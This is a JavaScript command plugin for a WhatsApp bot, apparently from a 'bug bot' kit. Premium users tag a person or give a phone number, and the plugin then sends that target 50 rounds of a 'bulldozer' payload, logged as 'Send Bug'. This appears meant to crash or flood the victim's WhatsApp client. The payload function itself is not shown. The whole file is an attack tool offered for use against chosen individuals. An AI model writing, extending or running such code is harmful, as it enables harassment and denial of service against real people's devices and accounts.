// Plugin: alyadozer
// Auto-generated from Alya V12
// Commands: alyadozer

const path = require('path')

module.exports = {
  command: ["alyadozer"],
  tags: ['general'],
  run: async (alya, m, ctx) => {
    const {
      command, args, text, q, prefix, body, budy,
      sender, from, pushname, botNumber,
      isCmd, isGroup, isMedia, isImage, isVideo, isAudio, isSticker,
      isQuotedImage, isQuotedVideo, isQuotedSticker, isQuotedAudio,
      isQuotedDocument, isQuotedViewOnce, isQuotedLocation, isQuotedContact,
      groupMetadata, groupName, groupMembers, groupAdmins, groupOwner,
      isBotAdmins, isGroupAdmins, isAdmins, isAdminOrOwner,
      Ryuu, isPrem, isAly, isAlya, isSewa, jangan,
      quoted, mime, qmsg, content, type, chatUpdate, store,
      reply, replyalya, replytolak, replyprem,
      senderNumber, chath, pes, messagesC, bady,
      waifuList, husbuList, pler, setting, user
    } = ctx

        if (!isPrem && !Ryuu) return replytolak(mess.only.premium)
        if (!q && !m.mentionedJid[0])
            return reply('Target mana? tag/nomor');

        const target = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : q.replace(/\D/g, '') + '@s.whatsapp.net';

        reply(`Executing 50x`);

        for (let i = 0; i < 50; i++) {
            try {
                await bulldozernew(alya, target);
                await new Promise(r => setTimeout(r, 700));
            } catch (e) {
                console.error('Send Bug Error', e);
            }
        }

        reply('Send Bug dozer');
  }
}
